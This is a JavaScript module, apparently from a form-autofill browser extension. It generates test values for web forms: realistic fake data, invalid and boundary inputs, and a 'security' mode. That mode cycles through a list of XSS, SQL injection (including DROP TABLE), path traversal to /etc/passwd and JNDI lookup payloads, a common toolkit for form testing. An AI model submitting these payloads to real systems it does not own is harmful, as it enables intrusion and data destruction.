/* AutoForm Fill — value generator: valid / invalid / boundary / extreme / security modes */
(() => {
  'use strict';

  const AFF = globalThis.AFF_CONTENT_UTILS;

  /* ---------------- primitive generators (valid/realistic) ---------------- */

  const gen = {};

  gen.firstName = (L) => AFF.rand(L.firstNames);
  gen.lastName = (L) => AFF.rand(L.lastNames);
  gen.fullName = (L) => `${gen.firstName(L)} ${gen.lastName(L)}`;

  gen.username = (name, seq) => {
    const base = (name || gen.fullName(AFF.LOCALE_DATA['en-US'])).toLowerCase().replace(/[^a-z]/g, '') || 'user';
    return base + (seq ? seq : AFF.randInt(10, 999));
  };

  gen.email = (ctx, L, settings, session, seq) => {
    let domain = null;
    if (/gmail/i.test(ctx)) domain = 'gmail.com';
    else if (/yahoo/i.test(ctx)) domain = 'yahoo.com';
    else if (/outlook|hotmail|live|msn/i.test(ctx)) domain = 'outlook.com';
    else if (/icloud|apple/i.test(ctx)) domain = 'icloud.com';
    else if (/proton/i.test(ctx)) domain = 'proton.me';
    else if (/company|work|office|corp|business/i.test(ctx)) domain = 'company.com';
    else if (settings?.email?.domain) domain = settings.email.domain;
    else domain = AFF.rand(L.emailDomains);

    let local;
    const style = settings?.email?.style || 'name.number';
    const first = session?.first || gen.firstName(L);
    const last = session?.last || gen.lastName(L);
    if (style === 'firstlast') local = `${first}${last}`.toLowerCase();
    else if (style === 'first.last') local = `${first}.${last}`.toLowerCase();
    else if (style === 'random') local = 'user' + AFF.randInt(1000, 9999999);
    else local = `${first}.${last}`.toLowerCase().replace(/[^a-z.]/g, '');

    if (settings?.sequence?.enabled) local += AFF.pad(seq || 1, settings.sequence.pad);
    else if (seq) local += seq;
    else local += AFF.randInt(1, 999);
    return `${local}@${domain}`;
  };

  gen.phone = (format, L) => (format === 'international' ? L.phoneIntl() : L.phoneLocal());

  gen.street = (L) => `${AFF.randInt(1, 999)} ${AFF.rand(L.streets)}`;
  gen.city = (L) => AFF.rand(L.cities);
  gen.state = (L) => AFF.rand(L.states);
  gen.zip = (L) => L.zip();
  gen.country = (L) => L.country;
  gen.company = (L) => `${AFF.rand(L.companyBase)} ${AFF.rand(L.companySuffix)}`.trim();

  const isoDate = (d) => `${d.getFullYear()}-${AFF.pad(d.getMonth() + 1, 2)}-${AFF.pad(d.getDate(), 2)}`;

  function dateInRange(fromYear, toYear) {
    const start = new Date(fromYear, 0, 1).getTime();
    const end = new Date(toYear, 11, 31).getTime();
    return new Date(start + Math.random() * (end - start));
  }

  gen.date = (settings, constraints) => {
    let min = null, max = null;
    if (constraints?.min) min = new Date(constraints.min + 'T00:00:00');
    if (constraints?.max) max = new Date(constraints.max + 'T00:00:00');
    let d = dateInRange(settings.date.fromYear, settings.date.toYear);
    if (/admission|join|enroll|start.*date|from.*date/i.test(constraints?.ctx || '')) d = new Date();
    if (min && d < min) d = min;
    if (max && d > max) d = max;
    return isoDate(d);
  };

  gen.birthDate = (settings, constraints) => {
    let min = null, max = null;
    if (constraints?.min) min = new Date(constraints.min + 'T00:00:00');
    if (constraints?.max) max = new Date(constraints.max + 'T00:00:00');
    let d = dateInRange(settings.birth.fromYear, settings.birth.toYear);
    if (min && d < min) d = min;
    if (max && d > max) d = max;
    return isoDate(d);
  };

  gen.time = () => `${AFF.pad(AFF.randInt(8, 18), 2)}:${AFF.rand(['00', '15', '30', '45'])}`;
  gen.datetime = () => { const d = new Date(Date.now() + AFF.randInt(-30, 30) * 86400000); return isoDate(d) + 'T' + gen.time(); };
  gen.month = () => `${new Date().getFullYear()}-${AFF.pad(AFF.randInt(1, 12), 2)}`;
  gen.week = () => `${new Date().getFullYear()}-W${AFF.pad(AFF.randInt(1, 52), 2)}`;

  gen.number = (ctx, settings, constraints) => {
    let min = settings.number.min, max = settings.number.max;
    const dec = settings.number.decimals || 0;
    if (constraints?.min != null) min = Math.max(min, Number(constraints.min));
    if (constraints?.max != null) max = Math.min(max, Number(constraints.max));
    if (/age|year.*old|years?\s*old/i.test(ctx)) { min = Math.max(min, 18); max = Math.min(max, 75); }
    else if (/qty|quantity|count|num.*item/i.test(ctx)) { min = Math.max(min, 1); max = Math.min(max, 50); }
    else if (/year|birth\s*year|graduation/i.test(ctx)) { min = 1980; max = 2005; }
    else if (/percent|%/i.test(ctx)) { min = Math.max(min, 0); max = Math.min(max, 100); }
    else if (/price|salary|amount|income|revenue/i.test(ctx)) { min = 1000; max = 150000; }
    if (min > max) max = min;
    if (dec > 0) return (min + Math.random() * (max - min)).toFixed(dec);
    return String(AFF.randInt(min, max));
  };

  gen.password = (settings) => {
    const style = settings.password.style;
    const len = AFF.clamp(settings.password.length || 12, 6, 64);
    if (style === 'simple') return String(AFF.randInt(1000, 999999));
    if (style === 'complex') {
      const sets = ['abcdefghijkmnpqrstuvwxyz', 'ABCDEFGHJKLMNPQRSTUVWXYZ', '23456789', '!@#$%&*?'];
      let out = sets.map((s) => s[AFF.randInt(0, s.length - 1)]).join('');
      while (out.length < len) out += AFF.rand(sets.join(''));
      return AFF.shuffle(out.split('')).join('');
    }
    return 'Test' + AFF.randInt(1000, 9999) + '@' + AFF.pad(AFF.randInt(1, 99), 2);
  };

  gen.url = (ctx, L) => {
    const slug = AFF.rand(['demo', 'example', 'test-site', 'my-page', 'portfolio']);
    const tld = AFF.rand(L.tlds);
    if (/linkedin/i.test(ctx)) return `https://www.linkedin.com/in/${slug}-test`;
    if (/github/i.test(ctx)) return `https://github.com/${slug}dev`;
    if (/facebook/i.test(ctx)) return `https://www.facebook.com/${slug}.page`;
    if (/twitter|x\.com/i.test(ctx)) return `https://x.com/${slug}_test`;
    if (/www\./i.test(ctx)) return `https://www.${slug}.${tld}`;
    return `https://${slug}.${tld}`;
  };

  gen.sentence = () => AFF.rand(AFF.SENTENCES);
  gen.paragraph = (n) => Array.from({ length: n || 2 }, () => AFF.rand(AFF.SENTENCES)).join(' ');

  gen.lorem = (sentences) => {
    const n = sentences || 2;
    const out = [];
    for (let i = 0; i < n; i++) {
      const words = [];
      for (let w = 0; w < AFF.randInt(14, 24); w++) words.push(AFF.rand(AFF.LOREM_WORDS));
      out.push(words.join(' ').replace(/^./, (c) => c.toUpperCase()) + '.');
    }
    return out.join(' ');
  };

  gen.longText = (settings) => {
    const s = settings.textarea || {};
    if (s.strategy === 'lorem') return gen.lorem(s.sentences);
    return gen.paragraph(s.sentences);
  };

  gen.idNumber = (ctx) => {
    const digits = (n) => String(AFF.randInt(Math.pow(10, n - 1), Math.pow(10, n) - 1));
    if (/passport/i.test(ctx)) return AFF.rand(['B', 'A', 'X']) + digits(7);
    if (/voter/i.test(ctx)) return digits(3) + AFF.pad(AFF.randInt(0, 9999999999), 10);
    if (/driving|licence|license|dl\b/i.test(ctx)) return digits(2) + '-' + digits(4) + '-' + digits(5);
    if (/tax|tin\b/i.test(ctx)) return digits(12);
    if (/ssn/i.test(ctx)) return `${digits(3)}-${digits(2)}-${digits(4)}`;
    if (/iban/i.test(ctx)) return 'DE' + digits(2) + ' ' + digits(4) + ' ' + digits(4) + ' ' + digits(4) + ' ' + digits(4);
    if (/swift|bic/i.test(ctx)) return 'TESTUS33XXX';
    if (/routing/i.test(ctx)) return String(AFF.randInt(100000000, 999999999));
    if (/card|credit|debit/i.test(ctx)) return '4111 1111 1111 1111';
    if (/cvv|cvc/i.test(ctx)) return String(AFF.randInt(100, 999));
    if (/dash|hyphen|format|xxxx/i.test(ctx)) { const n = digits(12); return `${n.slice(0, 4)}-${n.slice(4, 8)}-${n.slice(8)}`; }
    return digits(10);
  };

  gen.color = () => '#' + Array.from({ length: 6 }, () => '0123456789abcdef'[AFF.randInt(0, 15)]).join('');

  /* ---------------- mode variants ---------------- */

  const INVALID = {
    name: () => AFF.rand(['12345', 'J0hn D03', '!!!', '   ']),
    email: () => AFF.rand(['not-an-email', 'user@@invalid', '@no-domain', 'user@', 'spaces in@mail.com']),
    phone: () => AFF.rand(['123', 'not-a-phone', '0000000000', 'abc-def-ghij']),
    address: () => AFF.rand(['!!!', 'x', '1234567890 '.repeat(6)]),
    city: () => '!!!!',
    zip: () => 'X0X0X0',
    state: () => '!!!!',
    country: () => '!!!!',
    company: () => '!!! ???',
    date: () => AFF.rand(['2021-02-30', '31/31/9999', 'not-a-date', '0000-00-00']),
    birthdate: () => '2077-13-45',
    number: () => AFF.rand(['-1', '0.5.5', '99999999999999999999', 'NaN']),
    password: () => AFF.rand(['123', 'a', '   ', '***']),
    url: () => AFF.rand(['not-a-url', 'ftp://', 'http://', 'javascript:void(0)']),
    id: () => AFF.rand(['0000', '!!!', 'ABCDEFGHI']),
    textarea: () => ''
  };

  const SECURITY_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "' OR '1'='1' --",
    "1'; DROP TABLE users; --",
    '../../etc/passwd',
    '${jndi:ldap://probe.example/a}',
    '{{7*7}}',
    '<svg onload=alert(1)>',
    '\x00\x00',
    '%00%1b%5d',
    "Robert'); DROP TABLE Students;--",
    '<iframe src="javascript:alert(1)">',
    'union select null, null, null --'
  ];

  function extremeFor(type) {
    const UNI = 'Ünïcödé 🌍 日本語 العربية עברית 🚀 Γεία';
    switch (type) {
      case 'name': return UNI + ' ' + 'N'.repeat(120);
      case 'email': return 'a'.repeat(80) + '@' + 'b'.repeat(60) + '.' + 'c'.repeat(30);
      case 'phone': return '+99999999999999999999';
      case 'address': return UNI + ', ' + '9'.repeat(200);
      case 'city': return UNI + ' '.repeat(30);
      case 'zip': return '999999999999';
      case 'state': return UNI.repeat(3);
      case 'country': return UNI.repeat(3);
      case 'company': return UNI + ' ' + 'Co'.repeat(60);
      case 'date': return AFF.rand(['1900-01-01', '9999-12-31', '2000-13-40']);
      case 'birthdate': return '9999-12-31';
      case 'number': return AFF.rand(['9999999999999999999999', '-9999999999999999999999', '0', '1e999']);
      case 'password': return 'P@ss' + 'w0rd'.repeat(30) + '!🔥';
      case 'url': return 'https://' + 'x'.repeat(200) + '.' + 'y'.repeat(60) + '/';
      case 'id': return '9'.repeat(80);
      case 'textarea': return gen.paragraph(4) + ' ' + UNI + '\n\n' + 'z'.repeat(500);
      default: return UNI;
    }
  }

  function boundaryFor(type, el, valid, settings, constraints) {
    const maxLen = constraints?.maxlength;
    const minLen = constraints?.minlength;
    const textLike = ['name', 'email', 'phone', 'address', 'city', 'zip', 'state', 'country', 'company', 'password', 'url', 'id'];
    if (textLike.includes(type)) {
      if (maxLen) return valid.slice(0, 0) + 'B'.repeat(maxLen);
      if (minLen) return 'b'.repeat(minLen);
      return 'B'.repeat(255);
    }
    if (type === 'textarea') return 'B'.repeat(maxLen || 1000);
    if (type === 'number') {
      if (constraints?.max != null) return String(constraints.max);
      if (constraints?.min != null) return String(constraints.min);
      return String(settings.number.max);
    }
    if (type === 'date' || type === 'birthdate') {
      if (constraints?.max) return String(constraints.max);
      if (constraints?.min) return String(constraints.min);
      return type === 'birthdate' ? `${settings.birth.toYear}-12-31` : `${settings.date.toYear}-12-31`;
    }
    return valid;
  }

  /* ---------------- main entry: generate a value for a type in the current mode ---------------- */

  function generate(type, ctx, env) {
    const { mode = 'valid', settings, session = {}, L, el, constraints = {}, index = 0, seq = 0 } = env || {};
    if (!L) return '';
    const s = settings;

    if (mode === 'security' && type !== 'select' && type !== 'checkbox' && type !== 'radio' && type !== 'file') {
      return SECURITY_PAYLOADS[index % SECURITY_PAYLOADS.length];
    }

    let valid;
    switch (type) {
      case 'name': {
        const nameCtx = ctx || '';
        if (/first|fname|given/i.test(nameCtx)) valid = session.first || (session.first = gen.firstName(L));
        else if (/last|lname|sur|family/i.test(nameCtx)) valid = session.last || (session.last = gen.lastName(L));
        else if (/middle|mname/i.test(nameCtx)) valid = gen.firstName(L);
        else if (/username|user\s*name|login/i.test(nameCtx)) valid = gen.username(session.first && session.last ? session.first + session.last : gen.fullName(L), seq || null);
        else valid = session.name || (session.name = gen.fullName(L));
        break;
      }
      case 'email': valid = session.email || (session.email = gen.email(ctx, L, s, session, seq)); break;
      case 'phone': valid = session.phone || (session.phone = gen.phone(s.phoneFormat, L)); break;
      case 'address':
        if (/city|town/i.test(ctx)) { valid = gen.city(L); break; }
        if (/zip|post|pin/i.test(ctx)) { valid = gen.zip(L); break; }
        if (/state|province|region|county/i.test(ctx)) { valid = gen.state(L); break; }
        if (/country|nation(?!al)/i.test(ctx)) { valid = L.country; break; }
        valid = gen.street(L); break;
      case 'city': valid = gen.city(L); break;
      case 'zip': valid = gen.zip(L); break;
      case 'state': valid = gen.state(L); break;
      case 'country': valid = L.country; break;
      case 'company': valid = session.company || (session.company = gen.company(L)); break;
      case 'date': valid = /birth|dob/i.test(ctx) ? gen.birthDate(s, constraints) : gen.date(s, constraints); break;
      case 'birthdate': valid = gen.birthDate(s, constraints); break;
      case 'number': valid = gen.number(ctx, s, constraints); break;
      case 'password': valid = gen.password(s); break;
      case 'url': valid = gen.url(ctx, L); break;
      case 'id': valid = gen.idNumber(ctx); break;
      case 'textarea': valid = gen.longText(s); break;
      default: valid = s.unknownText || 'Test';
    }

    if (mode === 'invalid') {
      const inv = INVALID[type];
      return inv ? inv() : valid;
    }
    if (mode === 'boundary') return boundaryFor(type, el, valid, s, constraints);
    if (mode === 'extreme') return extremeFor(type);
    return valid;
  }

  /* ---------------- token expansion for fixed-value rules ---------------- */

  function expandTokens(str, env) {
    const { session = {}, L, seq = 0, index = 0, settings } = env || {};
    if (!L) return String(str);
    return String(str)
      .replace(/\{seq(?::(\d+))?\}/gi, (_, p) => AFF.pad(seq || 1, p ? parseInt(p, 10) : (settings?.sequence?.pad || 0)))
      .replace(/\{uuid\}/gi, () => (crypto?.randomUUID ? crypto.randomUUID() : AFF.uid()))
      .replace(/\{ts\}/gi, () => String(Date.now()))
      .replace(/\{date\}/gi, () => isoDate(new Date()))
      .replace(/\{time\}/gi, () => gen.time())
      .replace(/\{rand:(\d+)\}/gi, (_, n) => Array.from({ length: parseInt(n, 10) || 5 }, () => '0123456789'[AFF.randInt(0, 9)]).join(''))
      .replace(/\{first\}/gi, () => session.first || gen.firstName(L))
      .replace(/\{last\}/gi, () => session.last || gen.lastName(L))
      .replace(/\{email\}/gi, () => session.email || gen.email('', L, settings, session, seq))
      .replace(/\{phone\}/gi, () => session.phone || gen.phone(settings?.phoneFormat || 'local', L))
      .replace(/\{city\}/gi, () => gen.city(L))
      .replace(/\{country\}/gi, () => L.country)
      .replace(/\{index\}/gi, () => String(index));
  }

  gen.isoDate = isoDate;
  gen.SECURITY_PAYLOADS = SECURITY_PAYLOADS;

  AFF.gen = gen;
  AFF.generate = generate;
  AFF.expandTokens = expandTokens;
})();
